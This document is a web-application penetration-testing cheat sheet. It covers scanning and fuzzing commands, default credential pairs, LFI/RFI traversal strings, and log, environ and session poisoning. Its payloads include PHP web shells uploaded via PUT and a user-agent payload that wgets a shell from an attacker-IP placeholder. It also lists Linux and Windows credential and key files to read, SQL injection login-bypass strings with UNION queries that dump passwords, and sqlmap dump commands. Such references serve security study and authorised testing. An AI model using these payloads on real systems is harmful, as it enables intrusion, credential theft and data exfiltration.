# Website Scanning/Fuzzing
		
Nikto

    nikto -h http://INSERTIPADDRESS
		
	With proxy:
    nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
	
Curl
    
    Get headers:
    curl -i INSERTIPADDRESS
	
    Get everything:
    curl -i -L INSERTIPADDRESS
	
    Check for title and all links:
    curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
	
    Look at page with just text:
    curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq
	
    Check if it is possible to upload:
    curl -v -X OPTIONS http://INSERTIPADDRESS/
    curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
	
    
	
Dirb

    dirb http://INSERTIPADDRESS

    Not recursive and with output file:
    dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt
	
	Test with specified wordlist
	dirb http://INSERTIPADDRESS /usr/share/wordlists/dirb/common.txt

    Test for specific extensions
    dirb http://INSERTIPADDRESS -X .php,.txt

    Through proxy
    dirb http://INSERTIPADDRESS -p PROXYIP:PROXYPORT -P proxyusername:proxypassword
	
	If new subsites/directories are found rerun nikto/dirb as necessary

Gobuster

	gobuster -u http://IPADDRESS/ -w words.txt
    
    Test for specific extensions
    gobuster -u http://IPADDRESS/ -w words.txt -x php,txt
	
Wordpress scanner
	
    wpscan -u http://INSERTIPADDRESS
	
	Enumerate users:
	wpscan -u http://INSERTIPADDRESS -e u

Default/Weak login
	
    Search documentation for default passwords and test them:
	http://www.defaultpassword.com/

    Google:
	site:webapplication.com password
	
    Common Username/Password combos:
	admin admin
    admin password
    admin <blank>
    admin <servicename>
    <servicename> <servicename>
    root root
    root admin
    root password
    root <servicename>
    <username> password
    <username> admin
    <username> username
    username <servicename>

# LFI/RFI

	Check source code for external or local references to other locations. 
    
    Use Burp to intercept and modify values to test for LFI/RFI
	
Encoded Traversal Strings:

    ../
    ..\
    ..\/
    %2e%2e%2f
    %252e%252e%252f
    %c0%ae%c0%ae%c0%af
    %uff0e%uff0e%u2215
    %uff0e%uff0e%u2216
    ..././
    ...\.\

Check php config options if possible
		
    RFI
	allow_url_fopen=on and allow_url_include=on
		
	Nullbyte Injection
	magic_quotes_gpc=off

LFI checkers

	fimap -u "http://INSERTIPADDRESS/example.php?test="
	
    dotdotpwn.pl -m http -h 192.168.1.1 -M GET
	
	
	Ordered output
    
    curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
    /root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=
	
Bypass execution with base64 filter
    
    http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=index 
	
    base64 -d savefile.php
	
Bypass extension with nullbyte and/or as parameter

    http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt%00
    http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt?
	
Code execution via /proc/self/environ and user agent

    Edit user agent in browser with payload and execute LFI

    USERAGENT: <?system('wget http://IPADDRESS/shell.php -O shell.php');?>
    LFI: www.website.com/view.php?page=../../../../../proc/self/environ

Web log poison

    nc 10.10.10.10 80
    GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
    Host: 10.10.10.10
    Connection: close

    LFI: www.website.com/view.php?page=../../../../../var/log/apache2/access.log&cmd=id

SSH auth.log poison

    ssh "<?php phpinfo();?>"@IPADDRESS
    
    LFI: www.website.com/view.php?page=../../../../../var/log/auth.log

PHP session file attack

    Use proxy to get PHP session id and try to poison variables submitted with payloads
    
    LFI: www.website.com/view.php?page=../../../../../var/lib/php/sess_as7sdfasd87392s

Linux LFI Files

    /etc/passwd
    /etc/shadow
    /etc/aliases
    /etc/anacrontab
    /etc/apache2/apache2.conf
    /etc/apache2/httpd.conf
    /etc/at.allow
    /etc/at.deny
    /etc/bashrc
    /etc/bootptab
    /etc/chrootUsers
    /etc/chttp.conf
    /etc/cron.allow
    /etc/cron.deny
    /etc/crontab
    /etc/cups/cupsd.conf
    /etc/exports
    /etc/fstab
    /etc/ftpaccess
    /etc/ftpchroot
    /etc/ftphosts
    /etc/groups
    /etc/grub.conf
    /etc/hosts
    /etc/hosts.allow
    /etc/hosts.deny
    /etc/httpd/access.conf
    /etc/httpd/conf/httpd.conf
    /etc/httpd/httpd.conf
    /etc/httpd/logs/access_log
    /etc/httpd/logs/access.log
    /etc/httpd/logs/error_log
    /etc/httpd/logs/error.log
    /etc/httpd/php.ini
    /etc/httpd/srm.conf
    /etc/inetd.conf
    /etc/inittab
    /etc/issue
    /etc/lighttpd.conf
    /etc/lilo.conf
    /etc/logrotate.d/ftp
    /etc/logrotate.d/proftpd
    /etc/logrotate.d/vsftpd.log
    /etc/lsb-release
    /etc/motd
    /etc/modules.conf
    /etc/motd
    /etc/mtab
    /etc/my.cnf
    /etc/my.conf
    /etc/mysql/my.cnf
    /etc/network/interfaces
    /etc/networks
    /etc/npasswd
    /etc/passwd
    /etc/php4.4/fcgi/php.ini
    /etc/php4/apache2/php.ini
    /etc/php4/apache/php.ini
    /etc/php4/cgi/php.ini
    /etc/php4/apache2/php.ini
    /etc/php5/apache2/php.ini
    /etc/php5/apache/php.ini
    /etc/php/apache2/php.ini
    /etc/php/apache/php.ini
    /etc/php/cgi/php.ini
    /etc/php.ini
    /etc/php/php4/php.ini
    /etc/php/php.ini
    /etc/printcap
    /etc/profile
    /etc/proftp.conf
    /etc/proftpd/proftpd.conf
    /etc/pure-ftpd.conf
    /etc/pureftpd.passwd
    /etc/pureftpd.pdb
    /etc/pure-ftpd/pure-ftpd.conf
    /etc/pure-ftpd/pure-ftpd.pdb
    /etc/pure-ftpd/putreftpd.pdb
    /etc/redhat-release
    /etc/resolv.conf
    /etc/samba/smb.conf
    /etc/snmpd.conf
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /etc/ssh/ssh_host_dsa_key
    /etc/ssh/ssh_host_dsa_key.pub
    /etc/ssh/ssh_host_key
    /etc/ssh/ssh_host_key.pub
    /etc/sysconfig/network
    /etc/syslog.conf
    /etc/termcap
    /etc/vhcs2/proftpd/proftpd.conf
    /etc/vsftpd.chroot_list
    /etc/vsftpd.conf
    /etc/vsftpd/vsftpd.conf
    /etc/wu-ftpd/ftpaccess
    /etc/wu-ftpd/ftphosts
    /etc/wu-ftpd/ftpusers
    /logs/pure-ftpd.log
    /logs/security_debug_log
    /logs/security_log
    /opt/lampp/etc/httpd.conf
    /opt/xampp/etc/php.ini
    /proc/cpuinfo
    /proc/filesystems
    /proc/interrupts
    /proc/ioports
    /proc/meminfo
    /proc/modules
    /proc/mounts
    /proc/stat
    /proc/swaps
    /proc/version
    /proc/self/net/arp
    /root/anaconda-ks.cfg
    /usr/etc/pure-ftpd.conf
    /usr/lib/php.ini
    /usr/lib/php/php.ini
    /usr/local/apache/conf/modsec.conf
    /usr/local/apache/conf/php.ini
    /usr/local/apache/log
    /usr/local/apache/logs
    /usr/local/apache/logs/access_log
    /usr/local/apache/logs/access.log
    /usr/local/apache/audit_log
    /usr/local/apache/error_log
    /usr/local/apache/error.log
    /usr/local/cpanel/logs
    /usr/local/cpanel/logs/access_log
    /usr/local/cpanel/logs/error_log
    /usr/local/cpanel/logs/license_log
    /usr/local/cpanel/logs/login_log
    /usr/local/cpanel/logs/stats_log
    /usr/local/etc/httpd/logs/access_log
    /usr/local/etc/httpd/logs/error_log
    /usr/local/etc/php.ini
    /usr/local/etc/pure-ftpd.conf
    /usr/local/etc/pureftpd.pdb
    /usr/local/lib/php.ini
    /usr/local/php4/httpd.conf
    /usr/local/php4/httpd.conf.php
    /usr/local/php4/lib/php.ini
    /usr/local/php5/httpd.conf
    /usr/local/php5/httpd.conf.php
    /usr/local/php5/lib/php.ini
    /usr/local/php/httpd.conf
    /usr/local/php/httpd.conf.ini
    /usr/local/php/lib/php.ini
    /usr/local/pureftpd/etc/pure-ftpd.conf
    /usr/local/pureftpd/etc/pureftpd.pdn
    /usr/local/pureftpd/sbin/pure-config.pl
    /usr/local/www/logs/httpd_log
    /usr/local/Zend/etc/php.ini
    /usr/sbin/pure-config.pl
    /var/adm/log/xferlog
    /var/apache2/config.inc
    /var/apache/logs/access_log
    /var/apache/logs/error_log
    /var/cpanel/cpanel.config
    /var/lib/mysql/my.cnf
    /var/lib/mysql/mysql/user.MYD
    /var/local/www/conf/php.ini
    /var/log/apache2/access_log
    /var/log/apache2/access.log
    /var/log/apache2/error_log
    /var/log/apache2/error.log
    /var/log/apache/access_log
    /var/log/apache/access.log
    /var/log/apache/error_log
    /var/log/apache/error.log
    /var/log/apache-ssl/access.log
    /var/log/apache-ssl/error.log
    /var/log/auth.log
    /var/log/boot
    /var/htmp
    /var/log/chttp.log
    /var/log/cups/error.log
    /var/log/daemon.log
    /var/log/debug
    /var/log/dmesg
    /var/log/dpkg.log
    /var/log/exim_mainlog
    /var/log/exim/mainlog
    /var/log/exim_paniclog
    /var/log/exim.paniclog
    /var/log/exim_rejectlog
    /var/log/exim/rejectlog
    /var/log/faillog
    /var/log/ftplog
    /var/log/ftp-proxy
    /var/log/ftp-proxy/ftp-proxy.log
    /var/log/httpd-access.log
    /var/log/httpd/access_log
    /var/log/httpd/access.log
    /var/log/httpd/error_log
    /var/log/httpd/error.log
    /var/log/httpsd/ssl.access_log
    /var/log/httpsd/ssl_log
    /var/log/kern.log
    /var/log/lastlog
    /var/log/lighttpd/access.log
    /var/log/lighttpd/error.log
    /var/log/lighttpd/lighttpd.access.log
    /var/log/lighttpd/lighttpd.error.log
    /var/log/mail.info
    /var/log/mail.log
    /var/log/maillog
    /var/log/mail.warn
    /var/log/message
    /var/log/messages
    /var/log/mysqlderror.log
    /var/log/mysql.log
    /var/log/mysql/mysql-bin.log
    /var/log/mysql/mysql.log
    /var/log/mysql/mysql-slow.log
    /var/log/proftpd
    /var/log/pureftpd.log
    /var/log/pure-ftpd/pure-ftpd.log
    /var/log/secure
    /var/log/vsftpd.log
    /var/log/wtmp
    /var/log/xferlog
    /var/log/yum.log
    /var/mysql.log
    /var/run/utmp
    /var/spool/cron/crontabs/root
    /var/webmin/miniserv.log
    /var/www/log/access_log
    /var/www/log/error_log
    /var/www/logs/access_log
    /var/www/logs/error_log
    /var/www/logs/access.log
    /var/www/logs/error.log
    ~/.atfp_history
    ~/.bash_history
    ~/.bash_logout
    ~/.bash_profile
    ~/.bashrc
    ~/.gtkrc
    ~/.login
    ~/.logout
    ~/.mysql_history
    ~/.nano_history
    ~/.php_history
    ~/.profile
    ~/.ssh/authorized_keys
    ~/.ssh/id_dsa
    ~/.ssh/id_dsa.pub
    ~/.ssh/id_rsa
    ~/.ssh/id_rsa.pub
    ~/.ssh/identity
    ~/.ssh/identity.pub
    ~/.viminfo
    ~/.wm_style
    ~/.Xdefaults
    ~/.xinitrc
    ~/.Xresources
    ~/.xsession

Windows LFI Files

    C:/Users/Administrator/NTUser.dat
    C:/Documents and Settings/Administrator/NTUser.dat
    C:/apache/logs/access.log
    C:/apache/logs/error.log
    C:/apache/php/php.ini
    C:/boot.ini
    C:/inetpub/wwwroot/global.asa
    C:/MySQL/data/hostname.err
    C:/MySQL/data/mysql.err
    C:/MySQL/data/mysql.log
    C:/MySQL/my.cnf
    C:/MySQL/my.ini
    C:/php4/php.ini
    C:/php5/php.ini
    C:/php/php.ini
    C:/Program Files/Apache Group/Apache2/conf/httpd.conf
    C:/Program Files/Apache Group/Apache/conf/httpd.conf
    C:/Program Files/Apache Group/Apache/logs/access.log
    C:/Program Files/Apache Group/Apache/logs/error.log
    C:/Program Files/FileZilla Server/FileZilla Server.xml
    C:/Program Files/MySQL/data/hostname.err
    C:/Program Files/MySQL/data/mysql-bin.log
    C:/Program Files/MySQL/data/mysql.err
    C:/Program Files/MySQL/data/mysql.log
    C:/Program Files/MySQL/my.ini
    C:/Program Files/MySQL/my.cnf
    C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
    C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
    C:/Program Files/MySQL/MySQL Server 5.0/my.ini
    C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
    C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
    C:/Program Files (x86)/Apache Group/Apache/conf/access.log
    C:/Program Files (x86)/Apache Group/Apache/conf/error.log
    C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
    C:/Program Files (x86)/xampp/apache/conf/httpd.conf
    C:/WINDOWS/php.ini
    C:/WINDOWS/Repair/SAM
    C:/Windows/repair/system
    C:/Windows/repair/software
    C:/Windows/repair/security
    C:/WINDOWS/System32/drivers/etc/hosts
    C:/Windows/win.ini
    C:/WINNT/php.ini
    C:/WINNT/win.ini
    C:/xampp/apache/bin/php.ini
    C:/xampp/apache/logs/access.log
    C:/xampp/apache/logs/error.log
    C:/Windows/Panther/Unattend/Unattended.xml
    C:/Windows/Panther/Unattended.xml
    C:/Windows/debug/NetSetup.log
    C:/Windows/system32/config/AppEvent.Evt
    C:/Windows/system32/config/SecEvent.Evt
    C:/Windows/system32/config/default.sav
    C:/Windows/system32/config/security.sav
    C:/Windows/system32/config/software.sav
    C:/Windows/system32/config/system.sav
    C:/Windows/system32/config/regback/default
    C:/Windows/system32/config/regback/sam
    C:/Windows/system32/config/regback/security
    C:/Windows/system32/config/regback/system
    C:/Windows/system32/config/regback/software
    C:/Program Files/MySQL/MySQL Server 5.1/my.ini
    C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
    C:/Windows/System32/inetsrv/config/applicationHost.config
    C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log

# SQL-Injection

Injection Cheat Sheet
	
	'
	admin' or '1'='1
    or 1=1
    or 1=1--
    or 1=1#
    or 1=1/*
    admin' --
    admin' #
    admin'/*
    admin' or '1'='1
    admin' or '1'='1'--
    admin' or '1'='1'#
    admin' or '1'='1'/*
    admin'or 1=1 or ''='
    admin' or 1=1
    admin' or 1=1--
    admin' or 1=1#
    admin' or 1=1/*
    admin') or ('1'='1
    admin') or ('1'='1'--
    admin') or ('1'='1'#
    admin') or ('1'='1'/*
    admin') or '1'='1
    admin') or '1'='1'--
    admin') or '1'='1'#
    admin') or '1'='1'/*
    1234 ' AND 1=0 UNION ALL SELECT 'admin', 
    admin" --
    admin" #
    admin"/*
    admin" or "1"="1
    admin" or "1"="1"--
    admin" or "1"="1"#
    admin" or "1"="1"/*
    admin"or 1=1 or ""="
    admin" or 1=1
    admin" or 1=1--
    admin" or 1=1#
    admin" or 1=1/*
    admin") or ("1"="1
    admin") or ("1"="1"--
    admin") or ("1"="1"#
    admin") or ("1"="1"/*
    admin") or "1"="1
    admin") or "1"="1"--
    admin") or "1"="1"#
    admin") or "1"="1"/*

    Get the list of tables: 
	1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables;
	
	Get the list of columns: 
	1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns;
	
	Example of getting username and password fields: 
	1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;

    Example with URL encoding:	
	http://INSERTIPADDRESS/database.php?id=1%20UNION%20SELECT%201,concat%28table_name,%27:%27,%20column_name%29%20FROM%20information_schema.columns


SQLMap

    Easy mode:
    sqlmap --wizard

	If you need to authenticate before you can access vulnerable parameter. Capture request with burp and save to request.txt:
    sqlmap -r request.txt
	
	Or grab cookie out of burp/proxy and insert into command line option:
	sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --cookie "PHPSESSIONID=1234example"
	
    Dump:
    sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql -D databasename -T tablename --dump
	
    Crawl:
    sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
		
## Misc

Generate unique wordlist off of website

	cewl -w websitewordlist.txt  http://INSERTIPADDRESS

Connect to WebDAV

    cadaver http://IPADDRESS/webdav


## Port 443 - HTTPS

    # Read SSL Cert
    openssl s_client -connect HOSTNAME:PORT -showcerts

    
    # Heartbleed
    sslscan INSERTIPADDRESS:443
